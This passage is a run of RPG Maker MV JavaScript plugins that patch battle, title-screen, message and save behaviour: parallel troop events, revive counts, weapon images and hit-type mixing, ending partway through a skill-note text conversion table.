 * @plugindesc troop @ALWAYS @PARALLEL that can exec more than once at any time.
 * @author agold404
 * @help WTF YEP
 * 1 line comment: @ALWAYS
 * 1 line comment: @PARALLEL
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=Scene_Boot.prototype;
k='start';
r=p[k]; (p[k]=function f(){
	$dataTroops.forEach(f.applyParallel);
	return f.ori.apply(this,arguments);
}).ori=r;
p[k].applyParallel=(dataobj)=>{ if(!dataobj) return;
	const idxs=new Set();
	dataobj.pages_parallelSet=undefined;
	for(let pgs=dataobj.pages,p=0;p!==pgs.length;++p){
		pgs[p].always=undefined; // non-number-able
		for(let cmds=pgs[p].list,c=0;c!==cmds.length;++c){
			if(cmds[c].code===108 && cmds[c].parameters[0]==="@ALWAYS"){
				pgs[p].always=true;
				break;
			}
		}
		pgs[p].parallel=undefined; // non-number-able
		for(let cmds=pgs[p].list,c=0;c!==cmds.length;++c){
			if(cmds[c].code===108 && cmds[c].parameters[0]==="@PARALLEL"){
				pgs[p].parallel=true;
				break;
			}
		}
		if(pgs[p].parallel && !pgs[p].always) idxs.add(p);
	}
	if(idxs.size) dataobj.pages_parallelSet=idxs;
};
}

{ const p=BattleManager;
k='update';
r=p[k]; (p[k]=function f(){
	this._updateSerial|=0; ++this._updateSerial; this._updateSerial&=0x7FFF;
	const rtv=f.ori.apply(this,arguments);
	if(!this.isBattleEnd()) $gameTroop.updateParallel();
	return rtv;
}).ori=r;
}

{ const p=Game_Interpreter.prototype;
k='clear';
r=p[k]; (p[k]=function f(){
	f.ori.apply(this,arguments);
	this._pageId=undefined;
}).ori=r;
}

{ const p=Game_Troop.prototype;
k='clear';
r=p[k]; (p[k]=function f(){
	(this._pendAlways=[]).s=new Set();
	this._itrpv=undefined;
	this._toBeSetPageSetTick=this._toBeSetPageIdx=undefined;
	return f.ori.apply(this,arguments);
}).ori=r;
k='updateParallel';
r=p[k]; (p[k]=function f(){
	if(!this._itrpv) this.troop().pages.forEach(f.forEach,this._itrpv=[]);
	for(let x=0,arr=this._itrpv,pgs=this.troop().pages;x!==arr.length;++x){
		const i=arr[x].tpgid;
		if(!arr[x].isRunning() && this.meetsConditions(pgs[i])){
			arr[x].setup(pgs[i].list);
			arr[x]._checkForceActionCnt=0; // cmd339
			arr[x]._pageId=i;
		}
		arr[x].update();
	}
}).ori=r;
p[k].forEach=function(pg,i){
	if(!pg.parallel) return;
	const tmp=new Game_Interpreter;
	tmp.tpgid=i;
	this.push(tmp);
};
new cfc(Game_Interpreter.prototype).add('command339',function f(){
	this.command339_chkCnt();
	return f.ori.apply(this,arguments);
}).add('command339_chkCnt',function f(){
	if(++this._checkForceActionCnt>=f.tbl[0]) throw new Error(f.tbl[1]+$gameTroop._troopId);
},[
1,
"@PARALLEL 裡面放\"強制行動\"可能會使 @PARALLEL 在非預期的時候被執行；放超過1個\"強制行動\"可能會使動畫不會消失，還請這場戰鬥ㄉ作者更正ㄛ\ntroop id = ",
]).add('setupChild',function f(){
	const rtv=f.ori.apply(this,arguments);
	this._childInterpreter._checkForceActionCnt=this._checkForceActionCnt;
	return rtv;
});
k='setupBattleEventPendedByActionSequence';
r=p[k]; (p[k]=function f(){
	if(this._toBeSetPageIdx>=0){
		const itrp=this._interpreter; if(!itrp.isRunning()){
			const p=this._toBeSetPageIdx,pgs=this.troop().pages;
			this._toBeSetPageIdx=undefined;
			itrp.setup(pgs[p].list);
			itrp._pageId=p;
			if(pgs[p].span<=1) this._eventFlags[p]=true;
			return true;
		}
	}
}).ori=r;
k='setupBattleEvent';
r=p[k]; (p[k]=function f(){
	let rtv;
	const itrp=this._interpreter;
	if(!itrp.isRunning() && this._toBeSetPageIdx===undefined){
		if(itrp.setupReservedCommonEvent()) return;
		const troop=this.troop();
		const parallelSet=troop.pages_parallelSet;
		const pgs=troop.pages;
		itrp._pageId=undefined;
		for(let p=0;p!==pgs.length;++p){
			if(parallelSet && parallelSet.has(p)) continue;
			if(!this._eventFlags[p] && this.meetsConditions(pgs[p])){
				this._toBeSetPageIdx=p;
				if(0&&f.tbl[0].has(BattleManager._phase)) BattleManager._actionList.push(['EVAL',['$gameTroop.setupBattleEventPendedByActionSequence()',]]);
				else rtv=this.setupBattleEventPendedByActionSequence();
				break;
			}
		}
		const us=BattleManager._updateSerial,arr=this._pendAlways; if(!arr.s) arr.s=new Set(arr);
		if(itrp._pageId>=0){
			const beAlways = pgs[itrp._pageId] && pgs[itrp._pageId].always && itrp._pageId ;
			if(beAlways>=0){
				arr.s.add(beAlways);
				arr.push(beAlways);
			}
			arr.us+=arr.us===us;
		}else if(arr.us!==us){
			arr.us=us;
			arr.s.clear();
			arr.forEach(f.tbl[1],this._eventFlags);
			arr.length=0;
		}
	}
	return rtv;
}).ori=r;
p[k].tbl=[
new Set(['actionList','actionTargetList',]),
function(i){ this[i]=false; },
];
}

})();


﻿"use strict";
/*:
 * @plugindesc record the number of gameover via battle
 * @author agold404
 * @help get value: window.battleGameoverCnt which will be undefined or a positive value.
 * the value will not be saved if the game restarts.
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=SceneManager;
k='goto';
r=p[k]; (p[k]=function f(){
	if(arguments[0]===Scene_Gameover && this._scene && this._scene.constructor===Scene_Battle){
		const k='battleGameoverCnt',p=window; //ConfigManager;
		p[k]|=0; ++p[k];
		//p.save();
	}
	return f.ori.apply(this,arguments);
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc switch a switch right before the saving
 * @author agold404
 * @help $gameTemp.saveSwitch="SWITCH";
 * SWITCH can be either
 * * a positive integer indicates switch id.
 * * a letter indicates self switch id.
 * * if SWITCH cannot be parsed as a number, then it is treated as a self switch id.
 * * if $gameTemp.saveSwitch is not a string, then omit it.
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=Game_Interpreter.prototype;
k='clear';
r=p[k]; (p[k]=function f(){
	$gameTemp.saveSwitch=undefined;
	return f.ori.apply(this,arguments);
}).ori=r;
k='command352';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	const nsc=SceneManager._nextScene;
	if(nsc){
		nsc._saveSwitch_interpreter=this;
		nsc._saveSwitch_id=$gameTemp.saveSwitch;
		$gameTemp.saveSwitch=undefined;
	}
	return rtv;
}).ori=r;
}

{ const p=Scene_Save.prototype;
p.saveSwitch=function(){
	const ss=this._saveSwitch_id;
	if(!ss||ss.constructor!==String) return;
	if(ss-0+1) $gameSwitches.setValue(ss,1);
	else{
		const it=this._saveSwitch_interpreter;
		$gameSelfSwitches.setValue([it._mapId,it._eventId,ss],1);
	}
};
k='onSavefileOk';
r=p[k]; (p[k]=function f(){
	this.saveSwitch();
	return f.ori.apply(this,arguments);
}).ori=r;
k='onSaveSuccess';
r=p[k]; (p[k]=function f(){
	this._saveSwitch_id=undefined;
	return f.ori.apply(this,arguments);
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc addStats_rmByDmg in states
 * @author agold404
 * @help addStats_rmByDmg
 * at note of states: <addStats_rmByDmg:1,2,3,...>
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;
{ const p=Game_Battler.prototype;
k='removeState';
r=p[k]; (p[k]=function f(){
	const dataobj=this._addStats_rmByDmg && $dataStates[arguments[0]];
	if(dataobj){
		const info = dataobj && dataobj.meta.addStats_rmByDmg;
		if(info){
			if(!dataobj.addStats_rmByDmg) dataobj.addStats_rmByDmg=info.split(',').filter((x,i,a)=>a[i]-=0);
			dataobj.addStats_rmByDmg.forEach(f.forEach,this._addStats_rmByDmg);
		}
	}
	const rtv=f.ori.apply(this,arguments);
	return rtv;
}).ori=r;
p[k].forEach=function(id){ const n=id-0; n && this.push(n); };
k='removeStatesByDamage';
r=p[k]; (p[k]=function f(){
	this._addStats_rmByDmg=[];
	const rtv=f.ori.apply(this,arguments);
	const arr=this._addStats_rmByDmg;
	this._addStats_rmByDmg=undefined;
	arr.forEach(f.forEach,this);
	return rtv;
}).ori=r;
p[k].forEach=function(id){ this.addState(id); };
}
})();


﻿"use strict";
/*:
 * @plugindesc 各別武器圖片設定
 * @author agold404
 * @help <weaponImg:filename_without_extension,numbers_in_img_0_based,motion>
 * 
 * motion: 0,1,2
 * 0 = Thrust
 * 1 = Swing
 * 2 = Missile
 * 
 * tech. detail:
 * mapping images to Weapon4..WeaponN..
 * then set weaponImageId
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=ImageManager;
k='loadSystem';
r=p[k]; (p[k]=function f(){
	arguments[0]=f.tbl[arguments[0]]||arguments[0];
	return f.ori.apply(this,arguments);
}).ori=r;
p[k].tbl={};
}

{ const p=Scene_Boot.prototype;
k='start';
r=p[k]; (p[k]=function f(){
	const note={
		a:[], // mapping tbl
		m:new Map(), // search tbl
		o:[], // dataobj
	};
	$dataWeapons.forEach(f.weaponImg_0,note);
	note.o.forEach(f.weaponImg_1,note);
	for(let x=0,arr=note.a,dst=ImageManager.loadSystem.tbl;x!==arr.length;++x) dst['Weapons'+(x+4)]=arr[x];
	return f.ori.apply(this,arguments);
}).ori=r;
(p[k].weaponImg_0=function f(dataobj){ if(!dataobj) return;
	// parsing meta / collect images
	const info=(dataobj.meta.weaponImg||'').split(',');
	if(info[0]){
		info[1] = info[1]-0 || 0;
		info[2] = f.tbl[info[2]] || info[2]-0 || 0;
		dataobj.weaponImg=info;
		this.o.push(dataobj);
		if(!this.m.has(info[0])){
			this.m.set(info[0],this.a.length);
			this.a.push(info[0]);
		}
	}else dataobj.weaponImg=undefined;
}).tbl={
	0:0,
	thrust:0,
	戳:0,
	1:1,
	swing:1,
	揮:1,
	2:2,
	missile:2,
	射:2,
};
p[k].weaponImg_1=function(dataobj){
	// converting .weaponImg[1]
	const info=dataobj.weaponImg;
	info[1]+=(this.m.get(info[0])+3)*12+1;
	info.weaponImageId=info[1];
	info.type=info[2];
};
}

{ const p=Game_Actor.prototype;
k='performAttack';
r=p[k]; (p[k]=function f(){
	const weapons = this.weapons();
	const bareHandsWeapons = (this.bareHandsWeapons && this.bareHandsWeapons());
	const weapon=(weapons&&weapons[0])||(bareHandsWeapons&&bareHandsWeapons[0]);
	const attackMotion = weapon && (weapon.weaponImg || $dataSystem.attackMotions[weapon.wtypeId]) || $dataSystem.attackMotions[0];
	if(attackMotion){
		f.tbl[attackMotion.type] && this.forceMotion(f.tbl[attackMotion.type]);
		this.startWeaponAnimation(attackMotion.weaponImageId);
	}
}).ori=r;
p[k].tbl=[
	'thrust',
	'swing',
	'missile',
];
}

})();


﻿"use strict";
/*:
 * @plugindesc 技能/道具當作普攻動作使角色執行普攻動作
 * @author agold404
 * @help <motionNormalAtk>
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=Game_Action.prototype;
k='isAttack';
r=p[k]; (p[k]=function(){
	const item=this.item();
	return item && item.meta.motionNormalAtk || item === $dataSkills[this.subject().attackSkillId()];
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc 被擊時隨機範圍內變換位置
 * @author agold404
 * @help enemy: <missRndMv>
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=Sprite_Battler.prototype;
k='setBattler';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	const sc=SceneManager._scene;
	if(sc){
		if(!sc._btlr2sp) sc._btlr2sp=new Map();
		sc._btlr2sp.set(this._battler,this);
	}
	return rtv;
}).ori=r;
k='onMiss';
r=p[k]; (p[k]=function(){
	if(this._battler._missRndMv){
		if(!this._missRndMv){
			const dst=this._missRndMv=[],src=this._battler._missRndMv;
			for(let z=4;z--;) dst[z]=src[z]||0;
			dst[2]-=dst[0]; dst[0]+=this._homeX;
			dst[3]-=dst[1]; dst[1]+=this._homeY;
		}
		this._homeX = this._missRndMv[0]+this._missRndMv[2]*Math.random();
		this._homeY = this._missRndMv[1]+this._missRndMv[3]*Math.random();
	}
}).ori=r;
}

{ const p=Game_Battler.prototype;
p.getSprite=function(){
	const sc=SceneManager._scene;
	return sc && sc._btlr2sp && sc._btlr2sp.get(this);
};
k='onMiss';
r=p[k]; (p[k]=function f(){
	const sp=this.getSprite(); if(sp) sp.onMiss();
}).ori=r;
}

{ const p=Game_Enemy.prototype;
k='setup';
r=p[k]; (p[k]=function f(){
	const dataobj=$dataEnemies[arguments[0]];
	const missRndMv=dataobj&&dataobj.meta.missRndMv;
	if(missRndMv) this._missRndMv=missRndMv.split(',').map(Number);
	return f.ori.apply(this,arguments);
}).ori=r;
}

{ const p=Game_Action.prototype;
k='apply';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	if(arguments[0]){
		const res=arguments[0].result();
		if(res && res.used && (res.missed||res.evaded)) arguments[0].onMiss();
	}
	return rtv;
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc 標題背景
 * @author agold404
 * @help 詳細說明
 * 第二行
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

const t1='Title_BlueMoonLegendRemake' , t2='Title_BlueMoonLegendRemake2';
const c1="toOther",c2="toMain";

{ const p=ConfigManager;
k='makeData';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	rtv.allClear=this.allClear;
	return rtv;
}).ori=r;
k='applyData';
r=p[k]; (p[k]=function f(){
	f.ori.apply(this,arguments);
	this.allClear = arguments[0].allClear;
}).ori=r;
}

{ const p=ImageManager;
k='loadTitle2';
r=p[k]; (p[k]=function f(){
	arguments[0]=f.tbl[arguments[0]]||arguments[0];
	return f.ori.apply(this,arguments);
}).ori=r;
p[k].tbl={
};
}

new cfc(Scene_Boot.prototype).add('create',function f(){
	const rtv=f.ori.apply(this,arguments);
	this.checkDlcOnly_addLoad();
	return rtv;
}).add('checkDlcOnly_addLoad',function f(){
	ImageManager.otherFiles_addLoad(f.tbl[0][0]);
},t=[
['data/Map008.json',],
"攸特only",
],true,true).add('terminate',function f(){
	const rtv=f.ori.apply(this,arguments);
	this.checkDlcOnly_determine();
	return rtv;
}).add('checkDlcOnly_determine',function f(){
	if(!ImageManager.otherFiles_getData(f.tbl[0][0])) ConfigManager.allClear=f.tbl[1];
	else ConfigManager.allClear=!!ConfigManager.allClear;
},t,true,true);

new cfc(Scene_Title.prototype).add(
/*
k='create';
r=p[k]; (p[k]=function f(){
	if(!$dataSystem._titleName_ori) $dataSystem._titleName_ori=[0,$dataSystem.title1Name,$dataSystem.title2Name];
	if(ConfigManager.allClear){
		$dataSystem.title1Name = window._sideStory||ConfigManager.allClear==="攸特only"?t2:t1;
	}else $dataSystem.title1Name=$dataSystem._titleName_ori[1];
	return f.ori.apply(this,arguments);
}).ori=r;
*/
'createBackground',function f(){
	const rtv=f.ori.apply(this,arguments);
	if(ConfigManager.allClear){
		this.addChild( this._backSprite1_1 = new Sprite(ImageManager.loadTitle1(t2)) );
		if(window._sideStory||ConfigManager.allClear===f.tbl[1]) this._backSprite1.alpha=0;
		else this._backSprite1_1.alpha=0;
	}
	return rtv;
},t).add('createCommandWindow',function f(){
	const rtv=f.ori.apply(this,arguments);
	const cw=this._commandWindow;
	if(cw._allClear=ConfigManager.allClear){
		if(ConfigManager.allClear===f.tbl[1]) return rtv;
		cw._sideStory=window._sideStory;
		{ const i=ImageManager,l=i.loadTitle2; l.call(i,c1); l.call(i,c2); }
		cw.setHandler('storys',  this.commandStorys.bind(this));
		cw.refresh();
	}
	return rtv;
},t).add('_setHiddenOpt',function f(){
	const cw=this._commandWindow;
	const sp=this._com_sprites && this._com_sprites[3];
	const frm=sp && Object.assign({},sp._frame);
	const imgName=( window._sideStory=cw._sideStory )||ConfigManager.allClear==="攸特only"?c2:c1;
	f.tbl.tbl={Command_3:imgName};
	if(frm){
		sp.bitmap=ImageManager.loadTitle2(imgName);
		sp.bitmap.addLoadListener(()=>{
			sp._frame=frm;
			sp._refresh();
		});
	}
	cw.refresh();
},ImageManager.loadTitle2,true,true).add('update',function f(){
	const rtv=f.ori.apply(this,arguments);
	if(ConfigManager.allClear===f.tbl[1]) window._sideStory=true;
	if(ConfigManager.allClear && !this._hiddenOptSet){
		this._hiddenOptSet=true;
		this._setHiddenOpt();
	}
	if(this._storyCnt){
		if(--this._storyCnt<=0){
			this._storyCnt=0;
			const showing=window._sideStory?this._backSprite1_1:this._backSprite1;
			const hiding=window._sideStory?this._backSprite1:this._backSprite1_1;
			
			showing.alpha=1;
			hiding.alpha=0;
		//	const cv=this.children;
		//	const idx1=cv.indexOf(this._backSprite1) , idx11=cv.indexOf(this._backSprite1_1) ;
		//	const tmp=this._backSprite1_1; this._backSprite1_1=cv[idx11]=this._backSprite1; this._backSprite1=cv[idx1]=tmp;
		}else{
			const showing=window._sideStory?this._backSprite1_1:this._backSprite1;
			const hiding=window._sideStory?this._backSprite1:this._backSprite1_1;
			showing.alpha+=(1-showing.alpha)/this._storyCnt;
			hiding.alpha=1-showing.alpha*showing.alpha;
		}
	}
	return rtv;
},t).add('commandStorys',function f(){
	const cw=this._commandWindow;
	this._storyCnt=30-(this._storyCnt||0);
	cw._sideStory^=1;
	this._setHiddenOpt();
	cw.active=true;
},undefined,true,true);

new cfc(Window_TitleCommand.prototype).add('makeCommandList',function f(){
	const rtv=f.ori.apply(this,arguments);
	if(this._allClear){
		if(ConfigManager.allClear===f.tbl[1]) return rtv;
		this.addCommand(this._sideStory?"Main Story":"Side Story",   'storys');
	}
},t);

})();


﻿"use strict";
/*:
 * @plugindesc when a troop.meta.endless is true, the battle never ends
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=Scene_Boot.prototype;
k='start';
r=p[k]; (p[k]=function f(){
	$dataTroops.forEach(f.forEach);
	return f.ori.apply(this,arguments);
}).ori=r;
p[k].forEach=(dataobj)=>{ if(!dataobj) return;
	if(!dataobj.meta) dataobj.meta=undefined;
};
}

{ const p=BattleManager;
k='checkBattleEnd';
r=p[k]; (p[k]=function f(){
	const meta=$gameTroop.troop().meta;
	if(meta && meta.endless) return false;
	return f.ori.apply(this,arguments);
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc reviveCount
 * @author agold404
 * @help <reviveCount:n> -> a trait
 * 戰鬥的自動復活次數
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t; const gbb=Game_BattlerBase;

new cfc(Game_Battler.prototype).add('onBattleStart',function f(){
	const rtv=f.ori.apply(this,arguments);
	this._reviveCount=this.reviveMaxCount();
	return rtv;
}).add('onBattleEnd',function f(){
	const rtv=f.ori.apply(this,arguments);
	this._reviveCount=undefined;
	return rtv;
});

{ const p=BattleManager;
k='checkBattleEnd';
r=p[k]; (p[k]=function f(){
	$gameTroop.members().forEach(f.forEach);
	$gameParty.members().forEach(f.forEach);
	return f.ori.apply(this,arguments);
}).ori=r;
p[k].forEach=btlr=>{
	if(btlr.isDead() && btlr._reviveCount>0){
		--btlr._reviveCount;
		btlr.startAnimation(150);
		btlr.revive();
		btlr.gainHp(btlr.mhp);
		btlr.gainMp(btlr.mmp);
		btlr.startDamagePopup();
	}
};
}

{ const p=gbb.prototype;
gbb.
	addEnum('TRAIT_REVIVECOUNT').
	addEnum('__END__');
p.reviveMaxCount=function(){
	return this.traitsSum(Game_BattlerBase.TRAIT_REVIVECOUNT,0);
};
}

{ const p=Scene_Boot.prototype;
k='start';
r=p[k]; (p[k]=function f(){
	$dataActors.forEach(f.forEach);
	$dataClasses.forEach(f.forEach);
	$dataWeapons.forEach(f.forEach);
	$dataArmors.forEach(f.forEach);
	$dataEnemies.forEach(f.forEach);
	// $dataStates.forEach(f.forEach); // not permanent
	return f.ori.apply(this,arguments);
}).ori=r;
p[k].forEach=dataobj=>{ if(!dataobj) return;
	const n=dataobj.meta.reviveCount-0;
	if(n) dataobj.traits.push({code:Game_BattlerBase.TRAIT_REVIVECOUNT,dataId:0,value:n});
};
}

})();


﻿"use strict";
/*:
 * @plugindesc 戰鬥開場+TP
 * @author agold404
 * @help <startTP:>
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=Scene_Boot.prototype;
k='start';
r=p[k]; (p[k]=function f(){
	$dataActors.forEach(f.forEach);
	$dataClasses.forEach(f.forEach);
	$dataWeapons.forEach(f.forEach);
	$dataArmors.forEach(f.forEach);
	$dataEnemies.forEach(f.forEach);
	$dataStates.forEach(f.forEach);
	return f.ori.apply(this,arguments);
}).ori=r;
p[k].forEach=dataobj=>{ if(!dataobj) return;
	dataobj.startTp=dataobj.meta.startTP-0||0;
};
}

{ const p=Game_Battler.prototype;
(p.startTp=function f(){
	return this.traitObjects().reduce(f.forEach,0);
}).forEach=(r,dataobj)=>(dataobj.startTp-0||0)+r;
k='onBattleStart';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	this.gainSilentTp(this.startTp());
	return rtv;
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc nameField
 * @author agold404
 * @help \F[name_here]
 * 
 * This plugin can be renamed as you want.
 */

window.isNone=o=>o===null||o===undefined;

(()=>{ let k,r,t;

{ const p=Game_Message.prototype;
k='clear';
r=p[k]; (p[k]=function f(){
	this._nameField=undefined;
	return f.ori.apply(this,arguments);
}).ori=r;
}

{ const p=Game_Interpreter.prototype;
new cfc(Game_Interpreter.prototype).add('command101',function f(){
	if($gameMessage.isBusy()) return false;
	$gameMessage.setFaceImage(this._params[0], this._params[1]);
	$gameMessage.setBackground(this._params[2]);
	$gameMessage.setPositionType(this._params[3]);
	let first=true;
	while (this.isContinueMessageString()) {
		++this._index;
		if (this._list[this._index].code === 401) {
			let txt=this.currentCommand().parameters[0];
			if(first){
				first=false;
				if(txt.slice(0,3)==="\\F["){
					const idx=txt.indexOf(']',3);
					$gameMessage._nameField=txt.slice(3,idx);
					txt=txt.slice(idx+1);
				}
			}
			$gameMessage.addText?$gameMessage.addText(txt):$gameMessage.add(txt);
		}
		if( $gameMessage._texts.length >= ($gameSystem.messageRows?$gameSystem.messageRows():SceneManager._scene._messageWindow.numVisibleRows()) ) break;
	}
	const func=f.tbl[this.nextEventCode()];
	if(func){
		++this._index;
		func.call(this);
	}
	++this._index;
	this.setWaitMode('message');
	return false;
},t=[],false,true).add('isContinueMessageString',function f(){
	const rtv=f.ori&&f.ori.apply(this,arguments);
	return rtv || f.tbl[0].some(f.tbl[1],this);
},[
[
function f(){ return this.nextEventCode() === 401; },
], // 0: 
function f(func){ return func.call(this); }, // 1: 
]);
for(let x=1e3;x--;) t[x]=0;
t[102]=function(){ this.setupChoices(this.currentCommand().parameters); };
t[103]=function(){ this.setupNumInput(this.currentCommand().parameters); };
t[104]=function(){ this.setupItemChoice(this.currentCommand().parameters); };
}

{ const p=Window_Message.prototype;
k='startMessage';
r=p[k]; (p[k]=function f(){
	if(!isNone($gameMessage._nameField)){
		let w=this.textWidth($gameMessage._nameField);
		if(w<Window_Base._faceWidth) w=Window_Base._faceWidth;
		const pad=((this.standardPadding()+this.textPadding())<<1)+1;
		w+=pad;
		if(this.width<w) w=this.width;
		if(!this._nameField){
			this._nameField=new Window_Help(1);
			this._nameField.y=-this._nameField.height;
			this._nameField.alpha=0;
		}
		this._nameField.width=w;
		this._nameField.contents.clear();
		this._nameField.drawText($gameMessage._nameField,this.textPadding(),0,w-pad,'center');
		//this._nameField.downArrowVisible=false;
		this._nameField.enabled=1;
		this.addChild(this._nameField);
	}else if(this._nameField) this._nameField.enabled=this._nameField.alpha=0;
	return f.ori.apply(this,arguments);
}).ori=r;
k='updateOpen';
r=p[k]; (p[k]=function f(){
	const op=this._opening;
	f.ori.call(this);
	if(this._opening===false && this._nameField && this._nameField.enabled) this._nameField.alpha=1;
	return this._opening;
}).ori=r;
k='updateClose';
r=p[k]; (p[k]=function f(){
	if(this._closing && this._nameField) this._nameField.alpha=0;
	f.ori.apply(this,arguments);
	return this._closing;
}).ori=r;
k='terminateMessage';
r=p[k]; (p[k]=function f(){
	if(this._nameField!==undefined) this._nameField.enabled=0;
	return f.ori.call(this);
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc ㄇㄉMOG你再沒寫好44看
 * @author agold404
 * @help 更新完道具類別不更新說明內容ㄉㄟ
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

if(typeof Window_ItemListM!=='undefined'){ const p=Window_ItemListM.prototype;
k='refresh';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	this.updateHelp();
	return rtv;
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc 物攻又魔攻
 * @author agold404
 * @help skill / item <addHitType:...>
 * ... = [PpMm,]*
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=Scene_Boot.prototype;
k='start';
r=p[k]; (p[k]=function f(){
	$dataItems.forEach(f.forEach);
	$dataSkills.forEach(f.forEach);
	return f.ori.apply(this,arguments);
}).ori=r;
(p[k].forEach=function f(dataobj){ if(!dataobj) return;
	const meta=dataobj.meta;
	let tbl;
	if(meta.addHitType){
		const dst=dataobj.addHitType=[],src=meta.addHitType.split(',');
		for(let x=0;x!==src.length;++x) dst.push(f.tbl.a2i[src[x]]||0);
		tbl=[0,0,0];
		++tbl[dataobj.hitType];
		for(let x=0;x!==dst.length;++x) ++tbl[dst[x]];
	}else dataobj.addHitType=undefined;
	dataobj.addHitTypeTbl = tbl?f.tbl.cache[tbl]||(f.tbl.cache[tbl]=tbl):f.tbl.general[dataobj.hitType]||[0,0,0];
}).tbl={
	a2i:{ P:1, M:2, p:1, m:2, },
	general:[
		[1,0,0],
		[0,1,0],
		[0,0,1],
	],
	cache:{},
};
}

new cfc(Game_Action.prototype).add('makeDamageValue',function f(target,critical){
	const item=this.item(),tbl=this.getItemHitTypeTbl(item);
	const baseValue=this.evalDamageFormula(target);
	const eleRate=this.calcElementRate(target);
	const hitTypeRate=(tbl[0]+tbl[1]*target.pdr+tbl[2]*target.mdr)/(tbl[0]+tbl[1]+tbl[2]||1);
	const rate=eleRate*hitTypeRate;
	let value=baseValue*rate;
	if(baseValue<0) value*=target.rec;
	if(critical) value=this.applyCritical(value);
	value=this.applyVariance(value, item.damage.variance, target);
	value=this.applyGuard(value, target);
	value=Math.round(value);
	this._weaknessRate=rate;
	return value;
},undefined,true,true).add('isCertainHit',function f(){
	return this.getItemHitTypeTbl(this.item())[Game_Action.HITTYPE_CERTAIN]; // ||f.ori.apply(this,arguments);
},undefined,true,true).add('isPhysical',function f(){
	return this.getItemHitTypeTbl(this.item())[Game_Action.HITTYPE_PHYSICAL]; // ||f.ori.apply(this,arguments);
},undefined,true,true).add('isMagical',function f(){
	return this.getItemHitTypeTbl(this.item())[Game_Action.HITTYPE_MAGICAL]; // ||f.ori.apply(this,arguments);
},undefined,true,true).add('itemHit',function(target){
	const item=this.item(),tbl=this.getItemHitTypeTbl(item);
	if(tbl[0]) return this.item().successRate*0.01;
	return (this.item().successRate*this.subject().hit*0.01) - (tbl[1]*target.eva+tbl[2]*target.mev)/(tbl[1]+tbl[2]||1);
},undefined,true,true).add('getItemHitTypeTbl',function f(item){
	return item.addHitTypeTbl;
},undefined,true,true);

})();


﻿"use strict";
/*:
 * @plugindesc 最好是舊到js不支援Array.flat啦
 * @author agold404
 * @help ㄇㄉ垃圾
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=Array.prototype;
if(!p.flat){
p.flat=function f(){
	const rtv=[];
	for(let x0=0;x0!==this.length;++x0){
		if(this[x0]&&this[x0].constructor===Array){
			for(let x1=0,arr=this[x0];x1!==arr.length;++x1){
				rtv.push(arr[x1]);
			}
		}else rtv.push(this[x0]);
	}
	return rtv;
};
}
}

})();


﻿"use strict";
/*:
 * @plugindesc 技能note區文字轉換表
 * @author agold404
 *
 * @help 麻煩用純文字編輯器打開此插件編輯轉換表
 * 
 * This plugin can be renamed as you want.
 */
(()=>{

// 格式: 轉換前的文字,轉換後的文字
// 資料結構型態如 mappings 中所展示
// 轉換效果: 依據在mappins中的順序，逐一取代所有找到的"轉換前"，變成"轉換後"
// 若先定義 ["A","B"] 再定義 ["B","C"] ，則最後所有 A 都會變成 C
// 請記得大小寫有別

const mappings=[

["轉換前的文字","轉換後的文字",],

["affect effect level clean","eval: BattleManager._action._dmgRate=1;"],
["affect effect level:","eval: BattleManager._action._dmgRate="],
["action effect level clean","eval: BattleManager._action._dmgRate=1;"],
["action effect level:","eval: BattleManager._action._dmgRate="],

];



const mappings_regExp=[
[/(.*)/g,"$1"],

[/(^|\n)action[ ]+effect[ ]+loopAni:[ ]+(on|off)[ ]*(?=($|\n))/gi,function(){
	return arguments[1]+"eval: BattleManager.setCurrentLoopAniO"+arguments[2].slice(1)+"();";
}],

[/(^|\n)target[ ]+move[ ]+delta:[ ]+([^\n ]+)[ ]+([^\n ]+)([ ]+([^\n ]+))?(?=($|\n))/gi,function(){
	const dx=arguments[2]-0,dy=arguments[3]-0,time=arguments[5]-0||0;
	if(isNaN(dx)||isNaN(dy)) throw new Error('p');
	return arguments[1]+"eval: BattleManager._targets.map(t=>SceneManager._scene._btlr2sp.get(t)).forEach(b=>b.startMoveDelta("+dx+','+dy+','+time+"))";
}],
[/(^|\n)target[ ]+move[ ]+(user|subject)(: ([^\n ]+))?(?=($|\n))/gi,function(){
	const time=arguments[4]-0||0;
	return arguments[1]+"eval: { let b2s=SceneManager._scene._btlr2sp,s=b2s.get(BattleManager._subject); BattleManager._targets.map(t=>b2s.get(t)).forEach(b=>b.startMoveTo(s,"+time+")); }";
}],

